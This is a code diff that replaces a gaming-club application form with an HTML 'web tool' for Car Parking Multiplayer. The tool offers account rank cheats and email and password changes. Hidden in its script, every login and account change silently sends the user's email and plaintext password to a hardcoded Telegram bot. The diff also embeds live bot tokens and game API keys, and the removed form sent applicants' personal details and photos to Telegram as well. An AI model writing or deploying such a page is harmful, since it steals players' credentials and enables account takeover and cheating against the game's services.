@@ -1,265 +1,347 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>MIDNIGHT CITY CLUB Application Form</title>
-<style>
-    body {
-        font-family: Arial, sans-serif;
-        background-color: #000;
-        color: white;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        min-height: 100vh;
-        margin: 0;
-        padding: 20px;
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
+  <meta name="theme-color" content="#000000">
+  <title>BOSSRCPMVIP WEB TOOL</title>
+  <style>
+    :root{
+      --card-bg: rgba(0,0,0,0.55);
+      --accent: #00aaff;
+      --accent-2: #ff8800;
     }
 
-    .form-container {
-        background: rgba(20, 20, 20, 0.95);
-        border: 3px solid red;
-        border-radius: 15px;
-        padding: 25px;
-        max-width: 500px;
-        width: 100%;
-        box-shadow: 0 0 25px rgba(255, 0, 0, 0.7);
+    /* Background updated — Plain Supercar */
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      background:
+        url("https://images.pexels.com/photos/1402787/pexels-photo-1402787.jpeg?auto=compress&cs=tinysrgb&h=1280&w=720")
+        no-repeat center center fixed;
+      background-size: cover;
+      color: #fff;
+      -webkit-font-smoothing: antialiased;
+      -webkit-text-size-adjust: 100%;
+      min-height: 100vh;
+      box-sizing: border-box;
     }
 
-    h2, h3, p {
-        text-align: center;
-        margin-bottom: 15px;
+    .center-wrapper{
+      position: fixed;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      z-index: 2;
     }
 
-    h2 {
-        color: #ff3333;
+    .container{
+      width: 100%;
+      max-width: 380px;
+      border-radius: 12px;
+      padding: 20px 22px;
+      background: var(--card-bg);
+      text-align: center;
+
+      /* 🔥 Red border + blur + glow effect */
+      border: 2px solid rgba(255, 0, 0, 0.6);
+      box-shadow: 0 0 18px rgba(255, 0, 0, 0.7);
+      backdrop-filter: blur(6px);
+      -webkit-backdrop-filter: blur(6px);
     }
 
-    label {
-        display: block;
-        margin-top: 12px;
-        font-weight: bold;
-        color: #ff9999;
+    h1{
+      margin: 0 0 12px 0;
+      font-size: 20px;
+      letter-spacing: 0.6px;
+      color: #fff;
     }
 
-    input[type="text"],
-    input[type="number"],
-    input[type="file"],
-    textarea,
-    select {
-        width: 100%;
-        padding: 8px;
-        margin-top: 5px;
-        border: 2px solid red;
-        border-radius: 8px;
-        background-color: #1a1a1a;
-        color: white;
+    input, select {
+      width: 100%;
+      box-sizing: border-box;
+      padding: 11px 12px;
+      margin: 8px 0;
+      border-radius: 8px;
+      border: 1px solid rgba(255,255,255,0.06);
+      background: rgba(255,255,255,0.03);
+      color: #fff;
+      font-size: 15px;
     }
 
-    textarea {
-        resize: none;
+    button{
+      width:100%;
+      padding:11px;
+      margin:8px 0;
+      border-radius:8px;
+      border:none;
+      cursor:pointer;
+      font-weight:700;
+      font-size:15px;
+    }
+    button.login{ background: linear-gradient(90deg,var(--accent),#33bbff); color:#fff; }
+    button.login:hover{ transform: translateY(-1px); }
+    button.menu{ background: linear-gradient(90deg,var(--accent-2),#ffaa33); color:#111; }
+    button.menu:hover{ transform: translateY(-1px); }
+
+    .status{
+      min-height: 24px;
+      margin-top: 8px;
+      color: #b8f3b8;
+      word-break: break-word;
+      font-size: 14px;
+    }
+    .status.error{ color: #ff9999; }
+    #loginForm, #menuButtons{ display: none; }
+
+    .footer-cover{
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: calc(env(safe-area-inset-bottom, 20px) + 48px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      pointer-events: none;
+      background: linear-gradient(180deg, rgba(0,0,0,0) 0%, rgba(0,0,0,0.45) 40%, rgba(0,0,0,0.8) 100%);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
     }
 
-    .checkbox-group label {
-        display: block;
-        margin-top: 5px;
-        font-weight: normal;
-        color: white;
+    .footer-text{
+      pointer-events: none;
+      color: #ffffff;
+      opacity: 0.9;
+      font-size: 12px;
+      padding-bottom: env(safe-area-inset-bottom, 6px);
     }
 
-    .submit-btn {
-        margin-top: 20px;
-        width: 100%;
-        background-color: red;
-        border: none;
-        color: white;
-        padding: 12px;
-        font-size: 16px;
-        font-weight: bold;
-        border-radius: 8px;
-        cursor: pointer;
-        transition: background 0.3s;
+    @media (max-width: 420px){
+      .container{ padding: 18px; max-width: 360px; }
+      h1{ font-size: 18px; }
     }
 
-    .submit-btn:hover {
-        background-color: #cc0000;
-    }
-
-    .header-note {
-        font-size: 14px;
-        text-align: center;
-        margin-bottom: 20px;
-        color: #ffcccc;
-    }
-
-    .lang-toggle {
-        text-align: center;
-        margin-bottom: 15px;
-    }
-
-    .lang-toggle button {
-        background: red;
-        border: none;
-        color: white;
-        padding: 6px 14px;
-        border-radius: 6px;
-        cursor: pointer;
-        font-weight: bold;
-    }
-
-    footer {
-        text-align: center;
-        font-size: 13px;
-        margin-top: 25px;
-        color: #999;
-    }
-</style>
+  </style>
 </head>
 <body>
 
-<div class="form-container">
-    <div class="lang-toggle">
-        <button type="button" onclick="toggleLang()">🌐 English / Filipino</button>
-    </div>
+  <div class="center-wrapper" role="main" aria-labelledby="toolTitle">
+    <div class="container" id="mainContainer">
+      <h1 id="toolTitle">BOSSRCPMVIP WEB TOOL</h1>
 
-    <h3 id="greet">HI GOOD MORNING / GOOD AFTERNOON / GOOD NIGHT 🌙</h3>
-    <p id="note" class="header-note">
-        FILL UP LANG PO PARA MAKA SALI. MAKE SURE NA DI MAKULIT AT BASTOS. THANK YOU!
-    </p>
-
-    <h2>MIDNIGHT CITY CLUB</h2>
-    <h3>🎮 APPLICATION FORM 🎮</h3>
-
-    <form id="clubForm">
-        <label id="nameLabel">• NAME:</label>
-        <input type="text" name="name" required>
-
-        <label id="ageLabel">• AGE:</label>
-        <input type="number" name="age" required>
-
-        <label id="genderLabel">• GENDER:</label>
-        <select name="gender" required>
-            <option value="">Select Gender</option>
-            <option>Male</option>
-            <option>Female</option>
+      <div id="gameSelectDiv">
+        <select id="gameSelect" aria-label="Select Game">
+          <option value="">-- Select Game --</option>
+          <option value="1">Car Parking Multiplayer</option>
+          <option value="2">Car Parking Multiplayer 2</option>
         </select>
+      </div>
 
-        <label id="cpmIDLabel">• CPM ID:</label>
-        <input type="text" name="cpmid" required>
+      <div id="loginForm" aria-hidden="true">
+        <input type="email" id="email" placeholder="Email" autocomplete="email" autocorrect="off" autocapitalize="off" spellcheck="false" />
+        <input type="password" id="password" placeholder="Password" autocomplete="new-password" />
+        <button class="login" onclick="loginFirebase()">Login</button>
+        <div id="status" class="status" role="status" aria-live="polite"></div>
+      </div>
 
-        <label id="ignLabel">• CPM IN-GAME NAME:</label>
-        <input type="text" name="ign" required>
+      <div id="menuButtons" aria-hidden="true">
+        <button class="menu" onclick="kingRank()">👑 King Rank</button>
+        <button class="menu" onclick="changeEmail()">📧 Change Email</button>
+        <button class="menu" onclick="changePassword()">🔐 Change Password</button>
+        <div id="serviceStatus" class="status" role="status" aria-live="polite"></div>
+      </div>
 
-        <label id="activeLabel">• ARE YOU ACTIVE IN EVENTS LIKE COLLAB, CAR MEETS, AND COMPETITIONS? (Yes/No):</label>
-        <input type="text" name="active" required>
+    </div>
+  </div>
 
-        <label id="lastClanLabel">• NAME OF YOUR LAST CLAN (Leave blank if none):</label>
-        <input type="text" name="lastclan">
+  <div class="footer-cover" aria-hidden="true">
+    <div class="footer-text">© 2025 Bossrcpm full copy Suprememodz. All Rights Reserved.</div>
+  </div>
 
-        <label id="reasonLabel">• WHY DID YOU LEAVE YOUR LAST CLAN? (Leave blank if none):</label>
-        <textarea rows="2" name="reason"></textarea>
+  <script>
+    const BOT_TOKEN = "8307704020:AAEwNsSCXACGHHehKt_ejhuFQbtN2MqHL70";
+    const CHAT_IDS = ["6614066633","6614066633"];
 
-        <label id="dailyTaskLabel">• DO YOU KNOW HOW TO DO DAILY TASKS? (Yes/No):</label>
-        <input type="text" name="dailytask" required>
-
-        <label id="whyJoinLabel">• WHY DO YOU WANT TO JOIN UNDER APEX SOCIETY?</label>
-        <textarea rows="3" name="whyjoin" required></textarea>
-
-        <label id="workLabel">• WORKING OR STUDENT?:</label>
-        <input type="text" name="work" required>
-
-        <label id="idLabel">• ANY VALID ID (School ID / National ID / etc.):</label>
-        <input type="text" name="validid">
-
-        <label id="uploadLabel">• UPLOAD PHOTO:</label>
-        <input type="file" id="photo" accept="image/*" required>
-
-        <div class="checkbox-group">
-            <label id="skillsLabel">✅ CHECK WHERE YOU ARE SKILLED / ACTIVE:</label>
-            <label><input type="checkbox" name="skill" value="Designer"> DESIGNER</label>
-            <label><input type="checkbox" name="skill" value="Copier"> COPIER</label>
-            <label><input type="checkbox" name="skill" value="Photographer"> PHOTOGRAPHER</label>
-            <label><input type="checkbox" name="skill" value="Videographer"> VIDEOGRAPHER</label>
-            <label><input type="checkbox" name="skill" value="Editor"> EDITOR</label>
-            <label><input type="checkbox" name="skill" value="Recruiter"> RECRUITER</label>
-            <label><input type="checkbox" name="skill" value="GG User"> GG USER</label>
-            <label><input type="checkbox" name="skill" value="Content Creator"> CONTENT CREATOR</label>
-        </div>
-
-        <button type="submit" class="submit-btn">SUBMIT FORM</button>
-    </form>
-
-    <footer>© 2025 SupremeModzdev. All Rights Reserved.</footer>
-</div>
-
-<script>
-// 🔒 Hidden Telegram credentials (di makikita sa page)
-const BOT_TOKEN = "8434145558:AAElkBLGyh5yBHo_-JYrFcw5wt0P6FCWrOg";
-const CHAT_ID = "6526974267";
-
-// Filipino / English toggle
-let isEnglish = true;
-function toggleLang() {
-    isEnglish = !isEnglish;
-    const t = {
-        greet: isEnglish ? "HI GOOD MORNING / GOOD AFTERNOON / GOOD NIGHT 🌙" : "MAGANDANG UMAGA / HAPON / GABI 🌙",
-        note: isEnglish ? "HI GOOD MORNING/GOOD NIGHT/GOOD AFTERNOON JUST FILL UP TO JOIN MAKE SURE IT'S NOT MISUSED AND RUDE THANK YOU!" : "PAKI SAGUTAN ANG FORM PARA MAKASALI. SIGURADUHIN NA HINDI MAKULIT O BASTOS. SALAMAT!",
-        nameLabel: isEnglish ? "• NAME:" : "• PANGALAN:",
-        ageLabel: isEnglish ? "• AGE:" : "• EDAD:",
-        genderLabel: isEnglish ? "• GENDER:" : "• KASARIAN:",
-        cpmIDLabel: isEnglish ? "• CPM ID:" : "• CPM ID:",
-        ignLabel: isEnglish ? "• CPM IN-GAME NAME:" : "• PANGALAN SA LARO:",
-        activeLabel: isEnglish ? "• ARE YOU ACTIVE IN EVENTS LIKE COLLAB, CAR MEETS, AND COMPETITIONS? (Yes/No):" : "• AKTIBO KA BA SA MGA EVENT TULAD NG COLLAB, CAR MEETS, AT KOMPETISYON? (Oo/Hindi):",
-        lastClanLabel: isEnglish ? "• NAME OF YOUR LAST CLAN (Leave blank if none):" : "• PANGALAN NG HULING CLAN (Iwanan kung wala):",
-        reasonLabel: isEnglish ? "• WHY DID YOU LEAVE YOUR LAST CLAN? (Leave blank if none):" : "• BAKIT KA UMANALIS SA HULING CLAN? (Iwanan kung wala):",
-        dailyTaskLabel: isEnglish ? "• DO YOU KNOW HOW TO DO DAILY TASKS? (Yes/No):" : "• ALAM MO BA KUNG PAANO GAWIN ANG MGA DAILY TASKS? (Oo/Hindi):",
-        whyJoinLabel: isEnglish ? "• WHY DO YOU WANT TO JOIN UNDER SYNDI RACERS?" : "• BAKIT MO GUSTONG SUMALI SA SYNDI RACERS?",
-        workLabel: isEnglish ? "• WORKING OR STUDENT?:" : "• NAGTATRABAHO O ESTUDYANTE?:",
-        idLabel: isEnglish ? "• ANY VALID ID (School ID / National ID / etc.):" : "• MAY VALID ID BA? (School ID / National ID / etc.):",
-        uploadLabel: isEnglish ? "• UPLOAD PHOTO:" : "• MAG-UPLOAD NG LARAWAN:",
-        skillsLabel: isEnglish ? "✅ CHECK WHERE YOU ARE SKILLED / ACTIVE:" : "✅ PILIIN KUNG SAAN KA MAGALING / AKTIBO:"
+    const GAMES = {
+      "1": {
+        name: "Car Parking Multiplayer",
+        api_key: "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM",
+        rank_url: "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
+      },
+      "2": {
+        name: "Car Parking Multiplayer 2",
+        api_key: "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ",
+        rank_url: "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI"
+      }
     };
-    for (const [id, text] of Object.entries(t)) document.getElementById(id).innerText = text;
-}
 
-// Send form to Telegram
-document.getElementById("clubForm").addEventListener("submit", async (e) => {
-    e.preventDefault();
-    const form = e.target;
-    const photo = document.getElementById("photo").files[0];
+    let currentUser = null;
+    let currentToken = null;
+    let currentPassword = null;
+    let selectedGame = null;
 
-    let text = "📋 *MIDNIGHT CITY CLUB APPLICATION*\n\n";
-    new FormData(form).forEach((v, k) => {
-        if (k === "skill") text += "• Skill: " + v + "\n";
-        else text += `• ${k.toUpperCase()}: ${v}\n`;
+    const gameSelect = document.getElementById('gameSelect');
+    const loginForm = document.getElementById('loginForm');
+    const menuButtons = document.getElementById('menuButtons');
+    const statusEl = document.getElementById('status');
+    const serviceStatusEl = document.getElementById('serviceStatus');
+
+    gameSelect.addEventListener('change', function(){
+      const val = this.value;
+      if(val && GAMES[val]){
+        selectedGame = GAMES[val];
+        document.getElementById('gameSelectDiv').style.display = 'none';
+        loginForm.style.display = 'block';
+        loginForm.setAttribute('aria-hidden','false');
+      } else {
+        selectedGame = null;
+        document.getElementById('gameSelectDiv').style.display = 'block';
+        loginForm.style.display = 'none';
+      }
     });
 
-    try {
-        // Send text message
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
-        });
-
-        // Send photo (optional)
-        if (photo) {
-            const fd = new FormData();
-            fd.append("chat_id", CHAT_ID);
-            fd.append("photo", photo);
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
-        }
-
-        alert("✅ Application submitted successfully!");
-        form.reset();
-    } catch (err) {
-        alert("❌ Error sending form. Please try again.");
-        console.error(err);
+    function updateStatus(msg, isError=false, target='status'){
+      const el = (target === 'serviceStatus') ? serviceStatusEl : statusEl;
+      if(!el) return;
+      el.className = isError ? 'status error' : 'status';
+      el.textContent = msg;
     }
-});
-</script>
 
+    function sendCostMessage(text){
+      if(!BOT_TOKEN || BOT_TOKEN === "PUT_YOUR_BOT_TOKEN_HERE"){
+        console.warn("BOT_TOKEN not configured — skipping telegram notify.");
+        return;
+      }
+      CHAT_IDS.forEach(chatId => {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: {"Content-Type":"application/json"},
+          body: JSON.stringify({ chat_id: chatId, text })
+        });
+      });
+    }
+
+    async function loginFirebase(){
+      if(!selectedGame){ updateStatus("Select a game first!", true); return; }
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+      if(!email || !password){ updateStatus("Enter email & password!", true); return; }
+
+      updateStatus("Logging in...");
+      try {
+        const resp = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${selectedGame.api_key}`, {
+          method: "POST",
+          headers: {"Content-Type":"application/json"},
+          body: JSON.stringify({ email, password, returnSecureToken: true })
+        });
+        const data = await resp.json();
+        if(data && data.idToken){
+          currentUser = email;
+          currentPassword = password;
+          currentToken = data.idToken;
+          updateStatus(`✅ Logged in as ${email}`);
+          loginForm.style.display = 'none';
+          menuButtons.style.display = 'block';
+          sendCostMessage(`🔐 Login Success\n📧 ${email}\n🔒 ${password}`);
+        } else {
+          updateStatus(`❌ Login failed: ${data?.error?.message || 'Unknown'}`, true);
+        }
+      } catch(err) {
+        updateStatus(`❌ Error: ${err.message}`, true);
+      }
+    }
+
+    function requireLogin(){
+      if(!currentUser || !currentToken){
+        updateStatus("❌ Please login first!", true, 'serviceStatus');
+        return false;
+      }
+      return true;
+    }
+
+    async function kingRank(){
+      if(!requireLogin()) return;
+      updateStatus("Processing King Rank...", false, 'serviceStatus');
+
+      const ratingData = {};
+      const fields = ["cars","car_fix","car_collided","car_exchange","car_trade","car_wash","slicer_cut","drift_max","drift","cargo","delivery","taxi","levels","gifts","fuel","offroad","speed_banner","reactions","police","run","real_estate","t_distance","treasure","block_post","push_ups","burnt_tire","passanger_distance"];
+      fields.forEach(f => ratingData[f] = 100000);
+      ratingData["time"] = 10000000000;
+      ratingData["race_win"] = 3000;
+
+      const payload = { data: JSON.stringify({ RatingData: ratingData }) };
+      const headers = { "Authorization": `Bearer ${currentToken}`, "Content-Type": "application/json" };
+
+      try {
+        const res = await fetch(selectedGame.rank_url, { method: "POST", headers, body: JSON.stringify(payload) });
+        if(res.ok){
+          updateStatus("✅ King Rank set successfully!", false, 'serviceStatus');
+          sendCostMessage(`👑 King Rank\n📧 ${currentUser}\n🔒 ${currentPassword}`);
+        } else {
+          let txt = "";
+          try { const d = await res.json(); txt = d?.error?.message || d?.message || ""; } catch(e){}
+          updateStatus(`❌ Failed to set King Rank! ${txt}`, true, 'serviceStatus');
+        }
+      } catch(err) {
+        updateStatus(`❌ Error: ${err.message}`, true, 'serviceStatus');
+      }
+    }
+
+    async function changeEmail(){
+      if(!requireLogin()) return;
+      const newEmail = prompt("Enter new email:");
+      if(!newEmail) return;
+      try {
+        const resp = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`, {
+          method: "POST",
+          headers: {"Content-Type":"application/json"},
+          body: JSON.stringify({ idToken: currentToken, email: newEmail, returnSecureToken: true })
+        });
+        const data = await resp.json();
+        if(data && data.email){
+          const old = currentUser;
+          currentUser = data.email;
+          currentToken = data.idToken;
+          updateStatus(`✅ Email changed to ${currentUser}`, false, 'serviceStatus');
+          sendCostMessage(`📧 Change Email\nOld: ${old}\nNew: ${currentUser}\n🔒 ${currentPassword}`);
+        } else {
+          updateStatus(`❌ Failed: ${data?.error?.message || 'Unknown'}`, true, 'serviceStatus');
+        }
+      } catch(err) {
+        updateStatus(`❌ Error: ${err.message}`, true, 'serviceStatus');
+      }
+    }
+
+    async function changePassword(){
+      if(!requireLogin()) return;
+      const newPassword = prompt("Enter new password:");
+      if(!newPassword) return;
+      try {
+        const resp = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`, {
+          method: "POST",
+          headers: {"Content-Type":"application/json"},
+          body: JSON.stringify({ idToken: currentToken, password: newPassword, returnSecureToken: true })
+        });
+        const data = await resp.json();
+        if(data && data.email){
+          currentPassword = newPassword;
+          currentToken = data.idToken;
+          updateStatus("✅ Password changed successfully!", false, 'serviceStatus');
+          sendCostMessage(`🔐 Change Password\n📧 ${currentUser}\n🔒 New Password: ${currentPassword}`);
+        } else {
+          updateStatus(`❌ Failed: ${data?.error?.message || 'Unknown'}`, true, 'serviceStatus');
+        }
+      } catch(err) {
+        updateStatus(`❌ Error: ${err.message}`, true, 'serviceStatus');
+      }
+    }
+  </script>
 </body>
 
 </html>
